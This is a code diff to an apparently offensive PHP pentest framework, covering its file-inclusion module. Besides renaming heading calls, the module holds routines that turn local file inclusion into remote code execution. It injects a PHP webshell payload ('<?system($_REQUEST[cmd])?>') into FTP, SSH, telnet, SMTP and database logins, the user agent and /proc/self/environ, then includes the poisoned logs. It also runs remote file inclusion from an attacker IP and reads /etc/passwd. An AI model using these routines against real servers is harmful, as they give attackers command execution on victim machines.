@@ -50,9 +50,9 @@ Directory 	Description
 			
 	}
 	else {
-		//$this->ssTitre("Looking for log File - WebServer");
+		$this->ssTitre("Looking for log File - WebServer");
 		//if (!$this->ip4priv($this->ip)) $this->requette("firefox -search \"site:$this->vhost inurl:\\\"error.log\\\" intext:2014 ext:log\" ");			
-		$tab_log_webserver = file("$this->dir_tools/dico/fi_linux_log.dico");
+		$tab_log_webserver = file("$this->dir_tools/dico/fi_linux_log_webserver.dico");
 		//$tab_log_webserver = array("/var/www/log/error.log");
 		foreach ($tab_log_webserver as $path_log){
 			$path_log = trim($path_log);
@@ -111,7 +111,7 @@ public function lfi2template($path,$filter) {
 
 
 public function fi2rfi($cmd,$filter){
-	$this->titre(__FUNCTION__);
+	$this->gtitre(__FUNCTION__);
 	// for PHP and LINUX only 
 	// https://github.com/tennc/webshell
     $attacker_ip = $this->ip4addr4target($this->ip);
@@ -166,7 +166,7 @@ public function fi2lfi($cmd,$filter){
 }
 
 public function fi2log_poisoning($cmd,$filter){
-    $this->titre(__FUNCTION__);
+    $this->gtitre(__FUNCTION__);
     // for PHP and LINUX only
     $this->fi2log4db($cmd,$filter);$this->pause(); // OK
     //$this->fi2log4fd($cmd,$filter);$this->pause();
@@ -190,9 +190,9 @@ public function fi4pentest($OS){
         
      switch ($OS){
         case "linux" :
-            $cmd = "/etc/passwd";
-            $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";
-            $this->fi2rfi("cat $cmd",$filter);$this->pause(); // OK 
+            $cmd = "id";
+            $filter = "| grep 'uid=' | grep 'gid=' ";
+            $this->fi2rfi($cmd,$filter);$this->pause(); // OK 
             $this->fi2lfi($cmd,$filter);$this->pause();
             break;
             
@@ -210,7 +210,7 @@ public function fi4pentest($OS){
 }
 
 public function fi2log4ftp($cmd,$filter) {
-    $this->ssTitre(__FUNCTION__);
+    $this->titre(__FUNCTION__);
     $port_ftp = $this->ip2port4service("ftp");
     if (!empty($port_ftp)){
         $user2name = "<?system(\$_REQUEST[cmd])?>";
@@ -226,7 +226,7 @@ public function fi2log4ftp($cmd,$filter) {
 }
 
 public function fi2log4session($cmd,$filter) {
-    $this->ssTitre(__FUNCTION__);
+    $this->titre(__FUNCTION__);
 
 
         $id_session = $this->url2cookies($this->url);
@@ -245,7 +245,7 @@ public function fi2log4session($cmd,$filter) {
 }
 
 public function fi2log4useragent($cmd,$filter) {
-    $this->ssTitre(__FUNCTION__);
+    $this->titre(__FUNCTION__);
         $user2agent = "<?system(\\\$_REQUEST[cmd])?>";
         //$user2agent = $this->url2encode($user2agent);
         $path_log = "/proc/self/environ";
@@ -253,7 +253,7 @@ public function fi2log4useragent($cmd,$filter) {
 }
 
 public function fi2log4fd($cmd,$filter) {
-    $this->ssTitre(__FUNCTION__);
+    $this->titre(__FUNCTION__);
     
     /*
     Similarly /proc/self/fd/<id> (or it’s symlink: /dev/fd) can be used in combination with the HTTP Referer field to inject the payload into opened error-logs by apache2. 
@@ -284,7 +284,7 @@ with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (
 }
 
 public function fi2log4telnet($cmd,$filter) {
-    $this->ssTitre(__FUNCTION__);
+    $this->titre(__FUNCTION__);
     $port_db = $this->ip2port4service("telnet");
     if (!empty($port_db)){
         $user2name = "<?system(\$_REQUEST[cmd])?>";
@@ -307,7 +307,7 @@ public function fi2log4db($cmd,$filter) {
 }
 
 public function fi2log4db4mysql($cmd,$filter) {
-    $this->ssTitre(__FUNCTION__);
+    $this->titre(__FUNCTION__);
     $user2name = "<?system(\$_REQUEST[cmd])?>";
     $user2pass = "";
     
@@ -326,7 +326,7 @@ public function fi2log4db4mysql($cmd,$filter) {
 
 
 public function fi2log4db4mongodb($cmd,$filter) {
-    $this->ssTitre(__FUNCTION__);
+    $this->titre(__FUNCTION__);
     $user2name = "<?system(\$_REQUEST[cmd])?>";
     $user2pass = "";
     
@@ -345,7 +345,7 @@ public function fi2log4db4mongodb($cmd,$filter) {
 
 
 public function fi2log4db4postgresql($cmd,$filter) {
-    $this->ssTitre(__FUNCTION__);
+    $this->titre(__FUNCTION__);
     $user2name = "<?system(\$_REQUEST[cmd])?>";
     $user2pass = "";
     
@@ -364,7 +364,7 @@ public function fi2log4db4postgresql($cmd,$filter) {
 
 
 public function fi2log4ssh($cmd,$filter) {
-    $this->ssTitre(__FUNCTION__);
+    $this->titre(__FUNCTION__);
     $port_ssh = $this->ip2port4service("ssh");
     if (!empty($port_ssh)){
     $user2name = "<?system(\$_REQUEST[cmd])?>";
@@ -388,7 +388,7 @@ public function fi2log4ssh($cmd,$filter) {
 
 
 public function fi2log4smtp($cmd,$filter) {
-    $this->ssTitre(__FUNCTION__);
+    $this->titre(__FUNCTION__);
     $port_smtp = $this->ip2port4service("smtp");
     if (!empty($port_smtp)){
         $data = "<?system(\$_REQUEST[cmd])?>";
